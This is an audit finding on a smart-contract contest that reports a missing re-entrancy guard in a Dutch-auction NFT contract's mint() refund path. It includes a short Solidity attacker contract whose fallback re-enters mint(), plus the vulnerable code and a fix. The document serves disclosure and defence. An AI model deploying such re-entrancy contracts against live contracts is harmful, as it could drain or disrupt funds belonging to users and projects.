# [M] Lack of Re-Entrancy Guard in MeritDutchAuction's mint() Function

## Summary
Severity: Medium
Reporter: Elite0x01
Source: https://github.com/sherlock-audit/2023-07-beam-auction/blob/main/dutch-nft/src/MeritDutchAuction.sol#L163
Type: audit-issue

## Details
# Lack of Re-Entrancy Guard in MeritDutchAuction's mint() Function

## Summary
The mint() function in the MeritDutchAuction contract lacks a re-entrancy guard, making it vulnerable to re-entrancy attacks.

## Vulnerability Detail
The mint() function in the MeritDutchAuction contract lacks a re-entrancy guard, making it vulnerable to re-entrancy attacks. In line [163](https://github.com/sherlock-audit/2023-07-beam-auction/blob/main/dutch-nft/src/MeritDutchAuction.sol#L163), there is an external call where, if more Ether is sent than the price of the NFT, the rest will be refunded to msg.sender.

```solidity
            // If too much ETH was sent, refund the difference
            (bool success, ) = payable(msg.sender).call{value: msg.value - totalPaid}(bytes(""));
            require(success, "Refund failed");

```

An attacker can craft a malicious contract with a fallback function that repeatedly calls back the mint() function of the auction contract with 0 as the amount. This will cause the function to be re-entered multiple times.

Attack Contract:
```solidity
contract Attack {
    Auction auction;
    uint256 counter;

    constructor(address _addr) payable {
        auction = Auction(_addr);
    }

    function exploit() public {
        auction.mint{value: 1}(0);
    }

    fallback() external payable {
        if (counter < 100000) {
            counter++;
            auction.mint{value: 1}(0);
        }
    }
}
```
Although the CEI pattern is well implemented, it still opens up an attack vector for cross-function or cross-contract re-entrancy.


## Impact
Currently, the attacker can only re-enter the mint() function. However, if the project decides to extend the contract or add any new modules to the existing one in the future, this vulnerability may introduce critical cross-function/contract re-entrancy vulnerabilities.

## Code Snippet
The vulnerable code can be found at:
https://github.com/sherlock-audit/2023-07-beam-auction/blob/main/dutch-nft/src/MeritDutchAuction.sol#L128

```solidity
function mint(uint256 amount) external payable { //@audit no re-entrancy lock/mutex.
    // Checks
    // Cache mintedBefore to save on sloads
    uint256 mintedBefore = minted;
    // Cache mintedPerAddressBefore to save on sloads
    uint256 mintedPerAddressBefore = mintedPerAddress[msg.sender];
    // Price being paid is the current price
    uint256 pricePaid = getPrice();
    // Total price being paid is the current price times the amount of NFTs
    uint256 totalPaid = pricePaid * amount;
    // Auction must have started
    require(block.timestamp >= startTime, "Auction not started");
    // Cannot mint more than the mint cap
    require(mintedBefore + amount <= MINT_CAP, "Mint cap reached");
    // Cannot mint more than the cap per address
    require(mintedPerAddressBefore + amount <= CAP_PER_ADDRESS, "Mint cap per address reached");
    // Make sure enough ETH was sent in the transaction
    require(msg.value >= totalPaid, "Insufficient funds");

    // Effects
    // Update amount minted in total
    minted += amount;
    // Update amount minted per address
    mintedPerAddress[msg.sender] += amount;
    // Update amount of ETH raised
    totalRaised += totalPaid;

    // Interactions
    for(uint256 i = 0; i < amount; i++) {
        // Mint the amount of NFTs to the sender
        nft.mint(mintedBefore + i + 1, msg.sender);
    }

    if(msg.value > totalPaid) {
        // If too much ETH was sent, refund the difference
        (bool success, ) = payable(msg.sender).call{value: msg.value - totalPaid}(bytes(""));
        require(success, "Refund failed");
    }

    // Emit event for offchain integrations
    emit Minted(msg.sender, amount, pricePaid);
}
```

## Tool used
Manual Review

## Recommendation
To mitigate this vulnerability, it is recommended to add a re-entrancy guard, such as a re-entrancy lock/mutex, to the mint() function.
